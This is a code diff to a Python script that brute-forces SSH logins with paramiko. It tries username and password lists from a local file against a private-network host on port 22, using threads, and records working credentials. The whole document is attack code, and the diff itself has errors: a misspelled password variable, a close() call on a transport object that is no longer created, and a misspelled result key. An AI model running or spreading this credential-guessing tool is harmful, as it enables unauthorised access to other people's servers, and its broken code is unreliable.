@@ -1,5 +1,6 @@
 #! -*- coding:utf-8 -*-
 import socket
+import time
 import threading
 import paramiko
 result={}
@@ -19,8 +20,13 @@ def test(username,password,ip,port):
             try:
                 ssh = paramiko.SSHClient()
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                t = paramiko.Transport(ip, port)
-                t.connect(username=user, password=passwd)
+                # t = paramiko.Transport(ip, port)
+                lock.acquire()
+                print('\n 正在尝试：用户名：%s 密码：%s\n' % (user, passwd))
+                lock.release()
+                ssh.connect(ip,port,user, pwsswd)
+                time.sleep(0.05)
+                t.close()
                 lock.acquire()
                 flag=True
                 result['usernmae']=user
@@ -40,19 +46,23 @@ def brute(thread_num,ip,port):
     with open(r'C:\Users\dkl\Desktop\pppp.txt', 'r') as f:
         temp = f.readlines()
     password = [str.rstrip() for str in temp]
-
-    times = int(len(username) / thread_num)
     name=[]
-    for i in range(thread_num):
-        t1 = threading.Thread(target=test, args=(username[i*times:(i + 1) * times], password,ip,port))
-        t1.start()
-        name.append(t1)
-    for i in range(thread_num):
-        name[i].join()
-    if username[thread_num * times:]:
-        test(username[thread_num * times:], password,ip,port)
-    if 'count' not in result:
-        result['count']=count
+    if thread_num>0 and thread_num<len(username):
+        times = int(len(username) / thread_num)
+        for i in range(thread_num):
+            t1 = threading.Thread(target=test, args=(username[i*times:(i + 1) * times], password,ip,port))
+            t1.start()
+            name.append(t1)
+        for i in range(thread_num):
+            name[i].join()
+        if username[thread_num * times:]:
+            test(username[thread_num * times:], password,ip,port)
+        if 'count' not in result:
+            result['count']=count
+    else:
+        test(username,password,ip,port)
+        if 'count' not in result:
+            result['count']=count
 
 if __name__ == '__main__':
     brute(4,'192.168.80.130',22)
